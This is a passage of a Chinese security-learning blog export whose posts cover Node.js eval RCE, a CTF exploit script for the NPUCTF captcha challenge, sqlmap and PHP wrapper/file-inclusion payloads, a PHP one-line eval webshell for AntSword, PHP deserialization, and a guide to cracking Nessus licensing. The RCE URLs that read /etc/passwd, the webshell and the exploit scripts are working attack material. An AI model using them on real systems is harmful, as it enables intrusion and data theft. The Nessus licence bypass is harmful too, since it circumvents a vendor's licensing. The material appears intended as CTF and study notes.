代码执行漏洞利用这里以js的代码为例,可以看到直接eval了input的数据,所以存在RCE。 1234567var express = require(&#x27;express&#x27;);var app = express();app.get(&#x27;/&#x27;,function(req,res)&#123; var resp=eval(&quot;(&quot;+req.query.input+&quot;)&quot;); res.send(&#x27;Output&lt;/br&gt;&#x27;+resp);&#125;);app.listen(8001); 漏洞利用 https://127.0.0.1/?input=10*10 https://127.0.0.1/?input=require(%27child_process%27).execSync(%27cat+/etc/passwd%27).toString() https://127.0.0.1/?input=res.end(require(%27fs%27).readFileSync(%27/etc/passwd%27).toString()) RCE漏洞防御方案 尽量不要使用代码&amp;命令执行相关函数。 客户端提交的数据都是不可信的,变量在执行命令函数之前一定要进行过滤再执行,或将函数执行的变量值写死,不允许修改 使用WAF等安全产品进行防御。 RCE相关函数php命令执行 system exec shell_exec passthru popen proc_popen 代码执行 eval assert","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web安全之nodeJs","slug":"web安全之nodejs","date":"2020-09-21T08:01:51.000Z","updated":"2021-07-04T08:15:28.143Z","comments":true,"path":"2020/09/21/web安全之nodejs/","link":"","permalink":"http://yejuns.github.io/2020/09/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bnodejs/","excerpt":"","text":"最近在学习nodeJs，发现一些有趣的地方，总结一下 原型链自己写了相关的博客，看这边 弱类型类似php，直接看例子理解吧 123456console.log(1==&#x27;1&#x27;); //trueconsole.log(2&gt;&#x27;3&#x27;); //falseconsole.log(&#x27;1&#x27;&lt;&#x27;2&#x27;); //trueconsole.log(111&gt;&#x27;3&#x27;); //trueconsole.log(&#x27;111&#x27;&gt;&#x27;3&#x27;); //falseconsole.log(&#x27;ads&#x27;&gt;1); //false 总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false。 1234567console.log([]==[]); //falseconsole.log([]&gt;[]); //falseconsole.log([]&lt;[]); //falseconsole.log([7,2]&gt;[5]); //trueconsole.log([100,2]&lt;&#x27;test&#x27;); //trueconsole.log([1,2]&lt;&#x27;2&#x27;); //trueconsole.log([11,16]&lt;&quot;10&quot;); //false 总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较. 一些比较特别的相等 1234console.log(null==undefined) // 输出：trueconsole.log(null===undefined) // 输出：falseconsole.log(NaN==NaN) // 输出：falseconsole.log(NaN===NaN) // 输出：false 变量拼接 1234console.log(5+[6,6]); //56,3console.log(&quot;5&quot;+6); //56console.log(&quot;5&quot;+[6,6]); //56,6console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6 模块加载与命令执行在一些沙盒逃逸时我们通常是找到一个可以执行任意命令的payload，若是在ctf比赛中，我们需要getflag时通常是需要想尽办法加载模块来达成特殊要求。通过child_process模块来加载模块，获得exec，execfile，execSync。（child_process模块用来启动一个新的进程，一般用在处理一些定时执行的操作） 通过require加载模块如下：require(&#39;child_process&#39;).exec(&#39;calc&#39;); 通过global对象加载模块global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;); 有些情况下可以直接用require，如eval。 1234eval(&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;);setInterval(require(&#x27;child_process&#x27;).exec,1000,&quot;calc&quot;);setTimeout(require(&#x27;child_process&#x27;).exec,1000,&quot;calc&quot;);Function(&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)(); 大小写特性ES6模板字符串可以使用反引号替代括号执行函数，如: 1alert`test!!` 可以用反引号替代单引号双引号，可以在反引号内插入变量，如： 12var fruit = &quot;apple&quot;;console.log`i like $&#123;fruit&#125; very much`; 模板字符串是将我们的字符串作为参数传入函数中，而该参数是一个数组，该数组会在遇到${}时将字符串进行分割，具体为下： 123456[&quot;i like &quot;, &quot; very much&quot;, raw: Array(2)]0: &quot;i like &quot;1: &quot; very much&quot;length: 2raw: (2) [&quot;i like &quot;, &quot; very much&quot;]__proto__: Array(0) 实战这道题取自NPUCTF的验证码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const cookieSession = require(&#x27;cookie-session&#x27;);const fs = require(&#x27;fs&#x27;);const crypto = require(&#x27;crypto&#x27;);const keys = require(&#x27;./key.js&#x27;).keys;function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;function saferEval(str) &#123; if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123; return null; &#125; return eval(str);&#125; // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync(&#x27;./index.html&#x27;).toString();function render(results) &#123; return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123; name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 嘿嘿， keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#x27;/&#x27;, function (req, res) &#123; let result = &#x27;&#x27;; const results = req.session.results || []; const &#123; e, first, second &#125; = req.body; if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123; if (req.body.e) &#123; try &#123; result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; catch (e) &#123; console.log(e); result = &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); &#125; &#125; else &#123; results.unshift(&#x27;Not verified!&#x27;); &#125; if (results.length &gt; 13) &#123; results.pop(); &#125; req.session.results = results; res.send(render(req.session.results));&#125;);app.get(&#x27;/source&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;); res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123; console.log(&#x27;Start listening&#x27;)&#125;); 首先看到saferEval函数，我们看到只要绕过正则之后就可以利用在代码执行处所说的eval来执行代码；在此之前看看调用了saferEval的地方，这里要绕过就需要利用到前面说的弱类型了 1if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp;md5(first+keys[0]) === md5(second+keys[0])) first和second都是我们可控的，这里要我们first和second不相等但长度又需要相等，同时还要在最后加上key之后进行md5要相等，要符合一系列条件较难，然而弱类型帮了一把。 md5处使用了变量的拼接，因此我们可以利用类似&#39;a&#39;+key[0]==[&#39;a&#39;]+key[0]进行绕过，而且关键在于first和second的比较使用了!===。这也给绕过提供了帮助。 抓包时候会发现是默认请求类型是x-www-form-urlencoded，无法传输数组，但因为这里使用了body-parser模块内的json，因此可以改下头application/json。 123456789101112#-*- coding:utf-8 -*-#__author__: HhhMimport requestsimport jsonprint(&quot;Start the program:&quot;)url = &quot;http://xxx/&quot;headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;data = json.dumps(&#123;&#x27;e&#x27;: &quot;1+1&quot;, &quot;first&quot;: [1], &quot;second&quot;: &quot;1&quot;&#125;)r = requests.post(url, headers=headers, data=data)print(r.text) 输出为2，证明前面成功绕过了，接下来考虑saferEval，看看正则： 1str.replace(&#x2F;(?:Math(?:\\.\\w+)?)|[()+\\-*&#x2F;&amp;|^%&lt;&gt;&#x3D;,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| &#x2F;g, &#39;&#39;) 我们需要让我们的正则符合他的要求，利用前两个正则我们可以构造出如：(Math)，Math.xxx(xxx) 也支持使用arrow function（箭头函数），我们可以使用箭头函数配合Math通过原型获取到Function，使用我上面提到的Function，通过global一路调出来exec执行任意命令。 1Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.constructor) 这样虽然可以得到Function，但限于正则我们无法执行命令，这里绕过采用String.fromCharCode，String可以通过变量拼接拼接出一个字符串，再调用constructor获取到String对象。因此exp如下: 12345678910111213141516171819#-*- coding:utf-8 -*-#__author__: HhhMimport requestsimport jsonimport redef payload(): s = &quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot; return &#x27;,&#x27;.join([str(ord(i)) for i in s])a = payload()print(&quot;Start the program:&quot;)url = &quot;http://xxx/&quot;headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;e = &quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;0&#125;))()))(Math+1)&quot;.format(a)data = json.dumps(&#123;&#x27;e&#x27;: e, &quot;first&quot;: [1], &quot;second&quot;: &quot;1&quot;&#125;)r = requests.post(url, headers=headers, data=data)print(r.text)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SqlMap使用","slug":"SqlMap使用","date":"2020-08-31T08:01:51.000Z","updated":"2021-07-05T05:48:44.216Z","comments":true,"path":"2020/08/31/SqlMap使用/","link":"","permalink":"http://yejuns.github.io/2020/08/31/SqlMap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"SqlMapSqlMap是一个开源的测试渗透工具，可以用来自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。 简单示例123456789101112131415161718sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot;#基本格式，默认使用level 1，检测全部数据库类型sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; -f --banner --dbs --users# -f表示获取对应的指纹信息（fingerPrint），--banner表示数据库的banner信息，--dbs获取对应的数据库信息，--users获取用户信息sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3#指定数据库类型是mysql，检测级别为3（共5级，级别越高，检测越全面）sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --cookie &quot;id=1&quot; --level 2#当程序有防get注入的时候，使用cookie注入。（只有level2以上才会检测cookie）sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3 -D test --tables#查询test数据库下有哪些表sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3 -D test -T admin --columns#查询test数据库、admin表有哪些字段 一些注意点 level level是注入测试等级，一共有5级。级别越高，检测的内容也就越多。检测级别大于等于2的时候会检测cookie的注入，检测级别大于等于3的时候会检测User-Agent和Referer是否有注入。 risk参数是风险等级 等级越高测试的语句越多比如会测试UPDATE 等等对数据库进行操作. *指定注入点 sqlmap可以自动找到URL里的参数，从而确定注入点。但在遇到一些做了伪静态的网页就无法自动识别。 /admin/1/类似这种，SQLMap就无法进行注入测试，但它实际上可能是这样的：/admin.php?id=1,它是把参数隐藏在了URL中，对于这样URL，直接在参数后面加一个*就可以： 1sqlmap -u &quot;www.baidu.com/admin/1*&quot; POST数据 在 URL后跟上你要提交的POST数据，SQLMap 也会去自动测试。 1sqlmap.py -u &quot;http://baidu.com/admin.php&quot; --data=&quot;id=1&amp;name=admin&quot; 从文件载入HTTP请求测试 使用参数：-r 可以可以理解抓个包下来，获取 HTTP 请求然后保存在文件里，然后让 SQLMap 自己去解析请求来进行注入测试。 可以从 burpsuite 上抓包下来配合 SQLMap 进行联合使用。 Google搜索进行测试 注入测试的脚本 使用参数：-tamper WAF的存在，会有很强的输入验证功能，通过一定的判断机制检测输入的内容是否含有非法攻击语句。为了绕过输入验证，达到预期的SQL注入目标，须对原本SQL语句进行同义改写，这种改写在很多情况下是莫名其妙的，但就是这莫名其妙的语句可以通过严密的WAF防守，达到数据库层面。更为神奇的是，数据库可以执行这段看似奇怪的SQL语句，实现预期的攻击。 而SQLMap自带了一个脚本库（在tamper目录下），内置的脚本库对 payload 进行了混淆，使得可以有效地规避防火墙规则","categories":[],"tags":[{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"}]},{"title":"web安全之伪协议","slug":"web安全之伪协议","date":"2020-08-31T08:01:51.000Z","updated":"2021-07-05T02:55:06.762Z","comments":true,"path":"2020/08/31/web安全之伪协议/","link":"","permalink":"http://yejuns.github.io/2020/08/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"伪协议file伪协议，通过这个协议可以对系统中的文件进行包含， 条件: allow_url_fopen:off/on allow_url_include :off/on 示例： file://[文件的绝对路径和文件名]1http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt [文件的相对路径和文件名]1http://127.0.0.1/include.php?file=./phpinfo.txt [http：//网络路径和文件名]1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt php伪协议 条件： allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp 需要on 作用：php:// 访问各个输入/输出流（I/O streams）， 经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 zip:// &amp; bzip2:// &amp; zlib:// 协议 条件 allow_url_fopen:off/on allow_url_include :off/on 作用 zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等 示例 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传 1http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt phar:// 协议phar://协议与zip://类似，同样可以访问zip格式压缩包内容 1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt data:// 协议 条件 allow_url_fopen:on allow_url_include:on 作用 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 示例 data://text/plain, 1http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64, 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b http:// &amp; https:// 协议 条件 allow_url_fopen:on allow_url_include:on 作用 常规 URL形式，允许通过HTTP 1.0的 GET方法，以只读访问文件或资源。通常用于远程包含。 示例 1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web安全之伪协议与文件包含","slug":"web安全之文件包含","date":"2020-08-31T08:01:51.000Z","updated":"2021-07-05T02:55:20.729Z","comments":true,"path":"2020/08/31/web安全之文件包含/","link":"","permalink":"http://yejuns.github.io/2020/08/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"文件包含程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞 php中常见的文件包含函数，include(), include_once() , require_once() , fopen() , readfile() 本地包含:可以进行一些本地的文件读取 12345&lt;?php $filename = $_GET[&#x27;filename&#x27;]; include($filename);?&gt;# 如上述例子 在引用filename函数时,没有过滤，直接引用了这个函数,如果fileName这个文件是一句话木马，就会被执行 如果导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的 远程包含:可以对外网上的文件进行读取 要保证php.ini中allow_url_fopen和allow_url_include要为On，也就是打开状态，这就要引入伪协议的概念","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Nessus使用","slug":"Nessus使用","date":"2020-05-11T06:01:51.000Z","updated":"2021-07-10T10:20:05.737Z","comments":true,"path":"2020/05/11/Nessus使用/","link":"","permalink":"http://yejuns.github.io/2020/05/11/Nessus%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Nessus安装、破解Nessus号称是世界上最流行的漏洞扫描程序，可以用来做主机扫描，但由于试用版只能扫16个IP，于是我们这里要去破解一下。 下载安装下载地址：https://www.tenable.com/downloads/nessus?loginAttempted=true 直接根据自己的系统版本下载就行，我这里下的是X64.msi,然后安装就可以 安装完成后，在浏览器中输入：https://localhost:8834，打开Nessus进行初始化 第一步选择：Managed Scanner 第二步选择：Tenable.sc 接下来我们创建登录用户名和密码，然后等待进入系统，此时，除了系统版本，右侧内容均为空白，接下来的步骤就是依次补充各方面内容 安装liscence 和 Plugin_Set压缩包 在Nessus的安装目录下运行 .\\nessuscli.exe fetch --challenge,会得到challenge code 访问 https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true, 注册获取activation code 访问 https://plugins.nessus.org/v2/offline.php ，填写我们得到的code，页面会进行跳转，然后我们下载文件nessus.license和all-2.0.tar.gz 把下载的文件放在Nessus的安装目录下，在Nussus的安装目录下运行 12.\\nessuscli.exe update .\\all-2.0.tar.gz.\\nessuscli.exe fetch --register-offline .\\nessus.license 然后重启Nessus 123# wondows 下重启服务net stop &quot;Tenable Nessus&quot; net start &quot;Tenable Nessus&quot; 最后再次访问https://localhost:8834/#/, 会显示正在重新编译。等编译成功后，就可以发现主页上已经有了sacn的功能 破解 Nessus将扫描插件存放在D:\\tool\\Nessus\\nessus\\plugins, 后面破解会重置这个文件夹，所以我们先提前将里面已经编译好的插件备份出来; 修改安装目录下（D:\\tool\\Nessus）和plugins（D:\\tool\\Nessus\\plugins）目录下的plugin_feed_info.inc文件，将内容更改为123PLUGIN_SET &#x3D; 202107092353 ;&#x2F;&#x2F;这个时间就是你进行注册的时间PLUGIN_FEED &#x3D; &quot;ProfessionalFeed (Direct)&quot;;PLUGIN_FEED_TRANSPORT &#x3D; &quot;Tenable Network Security Lightning&quot;; 重启服务 这时候会发现D:\\tool\\Nessus\\plugins目录下的所有文件都被删除，这是因为Licensed Hosts无限使用后，Plugin_Set会被置空，我们需要将原先备份的文件重新拷贝过来，然后重启服务，就可以成功绕过16个ip的限制 可能出现的问题 如果遇到无法破解还是0~16IP限制，请检查PLUGIN_SET值为前面update all-2.0.tar.gz更新获得的值！ 由于Nessus服务每次重启后，都会重置plugin_feed_info.inc，这将会使nessus/plugins目录下所有的插件都被删除，无法扫描。 Nessus使用安装成功后，我们可以使用scanner进行扫描，主页面如下，提供了很多的模板给我们使用 我们选择basic Network scan,就可以进行扫描器的设置 然后就可以进行扫描，扫描的时间可能会比较久，最后会将结果显示出来。","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"蚁剑下载、安装、使用教程","slug":"蚁剑使用","date":"2020-04-21T06:01:51.000Z","updated":"2021-07-09T12:10:15.662Z","comments":true,"path":"2020/04/21/蚁剑使用/","link":"","permalink":"http://yejuns.github.io/2020/04/21/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8/","excerpt":"","text":"蚁剑下载、安装、使用教程最近重新学习web渗透，突然看到一个工具叫做蚁剑，据说比菜刀还要好用，将学习过程记录一下。 下载下载的时候需要下载两个部分，一个是项目核心源码”antSword“，另一个是加载器，地址是https://github.com/AntSwordProject/ 同时官方给出了详细的文档：https://doc.u0u.us/zh-hans/index.html 安装安装就很简单，去git上下载相应的加载器，然后安装运行。第一次运行选择的如果是空目录，会自动下载源代码到这个目录，待提示初始化完毕时，重新打开蚁剑加载器，即可看到蚁剑的主界面。（我这边无法打开最新的加载器，把版本换成V2.0就可以了） 使用使用其实跟菜刀几乎差不多，只是菜刀太老了，而且蚁剑功能更强大一些 添加一个shell首先：右键单击 - 添加数据其次：输入URL地址，连接密码以及编码设置。PHP语言推荐编辑器使用chr加密（可以自己添加编码器） 插件蚁剑有一个插件市场，可以去下载一些插件。 抓包分析设置一下代理，然后使用burpsuite抓包。根据上面的代理设置进行抓包，连接时拦截，可看见连接传输的内容（a是密码） 实战由于需要一个web环境，我这里有bwapp的环境，就拿来凑合一下。 蚁剑官方给我们提供了一些脚本可以使用，地址是 https://github.com/AntSwordProject/AwesomeScript 我们这里就用一个最简单的一句话木马 1234&lt;?phpecho &#x27;123&#x27;;eval($_REQUEST[&quot;a&quot;]);&gt; 然后将木马放在站点目录下 首先使用浏览器简单访问一下，正常显示，说明没有问题 打开蚁剑添加数据，测试连接 打开虚拟终端","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"fiddler安装以及使用","slug":"fiddler使用","date":"2020-02-21T06:01:51.000Z","updated":"2021-07-01T13:59:03.149Z","comments":true,"path":"2020/02/21/fiddler使用/","link":"","permalink":"http://yejuns.github.io/2020/02/21/fiddler%E4%BD%BF%E7%94%A8/","excerpt":"","text":"fiddler简介Fiddler是位于客户端和服务器端的HTTP代理，也是目前最常用的http抓包工具之一 。 它能够记录客户端和服务器之间的所有 HTTP请求，可以针对特定的HTTP请求，分析请求数据、设置断点、调试web应用、修改请求的数据，甚至可以修改服务器返回的数据，功能非常强大，是web调试的利器。 fiddler是代理，也就是说：客户端的所有请求都要先经过Fiddler，然后转发到相应的服务器，反之，服务器端的所有响应，也都会先经过Fiddler然后发送到客户端，基于这个原因，Fiddler支持所有可以设置http代理为127.0.0.1:8888的浏览器和应用程序。（如果本地启用了ssr等代理软件，如何开启fiddler，后面会讲到） fiddler安装","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"web安全之反序列化漏洞-php","slug":"web安全之反序列化漏洞-php","date":"2020-02-14T08:01:51.000Z","updated":"2021-07-12T12:13:30.617Z","comments":true,"path":"2020/02/14/web安全之反序列化漏洞-php/","link":"","permalink":"http://yejuns.github.io/2020/02/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-php/","excerpt":"","text":"1.序列化与反序列化 序列化是指把对象转换为字节序列的过程（便于保存在内存、文件、数据库中） 反序列化是指把字节序列恢复为对象的过程 常见的序列化格式：二进制格式、字节数组、json字符串、xml字符串 2.反序列化漏洞原理服务端未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程(进行反序列化的过程中自动触发了某些魔术方法,魔术方法里面的代码就会被加载执行)，从而导致代码执行，SQL注入，目录遍历等诸多不可控后果。 在PHP中,通过 serialize() 函数进行序列化操作,通过 unserialize() 进行反序列化操作。 serialize() //将一个对象转换成一个字符串 unserialize() //将字符串还原成一个对象 序列化格式详解 面向对象语法序列化与反序列化 1234// 将对象student序列化为字符串$a=serialize($student); // 将字符串$a反序列化为对象 $b = unserialize($a); 面向过程语法序列化与反序列化 123$name=&#x27;xiaodi&#x27;;$a=serialize($name); //将一个变量进行序列化: xiaodi =&gt; s:6:&quot;xiaodi&quot;;$b=unserialize($a); //将一个字符串进行反序列化): s:6:&quot;xiaodi&quot;; =&gt; xiaodi PHP反序列化漏洞常用魔术方法 12345__construct() # 当对象被创建时调用__sleep() # 在对象被序列化之前调用__destruct() # 当对象被销毁时调用__toString() # 当对象被当做字符串使用 __wakeup() # 在对象被反序列化之前调用 也就是说，这几个魔术方法的调用过程如下： 对象被创建时执行__construct。 使用serialize()序列化对象。先执行__sleep，再序列化。 unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup()方法，预先准备对象需要的资源。 把对象当做字符串使用，比如将对象与字符串进行拼接，或者使用echo输出对象，会执行__toString 程序运行完毕，对象自动销毁，执行__destruct。 3、实例讲解CVE-2016-7124反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。 漏洞示例代码： 12345678910111213141516171819&lt;?phpclass A&#123;var $target = &quot;test&quot;;function __wakeup()&#123; $this-&gt;target = &quot;wakeup!&quot;;&#125;function __destruct()&#123;$fp = fopen(&quot;C:\\\\phpstudy_pro\\\\WWW\\\\unserialize\\\\shell.php&quot;,&quot;w&quot;); fputs($fp,$this-&gt;target); fclose($fp);&#125;&#125;​$test = $_GET[&#x27;test&#x27;];$test_unseria = unserialize($test);​echo &quot;shell.php&lt;br/&gt;&quot;;include(&quot;.\\shell.php&quot;);?&gt; 代码正常的执行逻辑，应该是：unserialize( )会检查是否存在一个_wakeup( )方法。本例中存在，则会先调用_wakeup()方法，预先将对象中的target属性赋值为”wakeup!”。注意，不管用户传入的序列化字符串中的target属性为何值，__wakeup()都会把$target的值重置为”wakeup!”。 但是在反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。所以我们可以构造如下对象作为payload ?test=O:1:”A”:2:{s:6:”target”;s:18:”“;} 真实属性个数是1，只有1个target属性。我们在构造序列化字符串时，将表示对象属性个数的值写成任何大于2的整数，就可以跳过__wakeup()的执行。现在，程序执行的逻辑变为：直接使用unserialize()函数将用户传递的参数进行反序列化。程序执行结束，对象被销毁，调用__destruct()方法，将target变量的值写入文件shell.php中。而target变量的值就是我们用户构造的phpinfo()函数，","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"爬虫之Selenium","slug":"爬虫之selenium","date":"2020-01-31T08:01:51.000Z","updated":"2021-07-09T12:04:49.961Z","comments":true,"path":"2020/01/31/爬虫之selenium/","link":"","permalink":"http://yejuns.github.io/2020/01/31/%E7%88%AC%E8%99%AB%E4%B9%8Bselenium/","excerpt":"","text":"自己的实验需要用到selenium做功能测试，就正好过来总结一下使用的过程 关于SeleniumSelenium是一个用于Web应用程序的自动化测试工具，可以模拟浏览器操作。主要由三部分组成，包括``Selenium WebDriver, Selenium IDE, Selenium Grid`. Selenium WebDriver是客户端API接口，可以通过调用这些接口，访问浏览器驱动，浏览器驱动再访问浏览器。 Selenium IDE是一个浏览器插件，支持Chrome和Firefox,可以将手动测试过程记录下来，并产生自动化测试脚本，可以实现回放。 Selenium Grid可以实现分布式测试 安装Selenium 使用pip安装Selenium，pip install selenium 安装对应的浏览器驱动，只有这样才能驱动浏览器自动测试驱动的版本必须要和浏览器的版本对应（想要查看chrome浏览器版本，在url地址栏输入：chrome://version/；查了=看Firefox浏览器版本，选择菜单栏 Help -&gt; About Firefox） 我这里的版本是91.0.4472 ，注意前面的就可以了 然后可以查看 官方文档，最下面就有下载的链接， 后面的小版本影响不大，所以我们可以随便选一个 下载完成我看有的人会把驱动放到环境变量里面，我这就不配置了。 简单案例1234567from selenium import webdriverfrom time import sleepdriver = webdriver.Chrome(&quot;D:\\python_program\\my_selenium\\chromedriver_win32\\chromedriver.exe&quot;)# 这里要写到**.exe才行，不然会报错 [permissionerror winerror 5 拒绝访问]driver.get(&#x27;http://www.baidu.com)sleep(2)driver.quit() 运行成功后，会弹出一个相应的chrome浏览器，并定向到百度的页面 关于webDriverSelenium中定位元素的方法都定义在WebDriver类中，这些方法都以find_element_by开头，主要有下列API webDriver的常用属性有：webDriver的常用方法有(其实很多内容官方文档都提供了，我这边就不赘述了) Selenium IDE的使用Selenium IDE可以在chrome扩展程序中找到,安装完成后，主要界面如下然后在地址栏输入url，点击录制。就可以开始进行操作的录制录制结束后，界面上会显示相应的动作函数，可以选择导出为相关的脚本。(导出的脚本会很冗余) 123456789101112131415161718192021222324252627282930class TestTestCase(): def setup_method(self, method): self.driver = webdriver.Chrome() self.vars = &#123;&#125; def teardown_method(self, method): self.driver.quit() def wait_for_window(self, timeout = 2): time.sleep(round(timeout / 1000)) wh_now = self.driver.window_handles wh_then = self.vars[&quot;window_handles&quot;] if len(wh_now) &gt; len(wh_then): return set(wh_now).difference(set(wh_then)).pop() def test_testCase(self): self.driver.get(&quot;https://www.google.com.hk/&quot;) self.driver.set_window_size(1520, 807) self.driver.find_element(By.NAME, &quot;q&quot;).click() self.driver.find_element(By.CSS_SELECTOR, &quot;.sbhl .wM6W7d &gt; span&quot;).click() element = self.driver.find_element(By.CSS_SELECTOR, &quot;div:nth-child(2) &gt; .tF2Cxc .LC20lb&quot;) actions = ActionChains(self.driver) actions.move_to_element(element).perform() self.vars[&quot;window_handles&quot;] = self.driver.window_handles self.driver.find_element(By.CSS_SELECTOR, &quot;div:nth-child(2) &gt; .tF2Cxc .LC20lb&quot;).click() self.vars[&quot;win8089&quot;] = self.wait_for_window(2000) element = self.driver.find_element(By.CSS_SELECTOR, &quot;body&quot;) actions = ActionChains(self.driver) actions.move_to_element(element, 0, 0).perform() 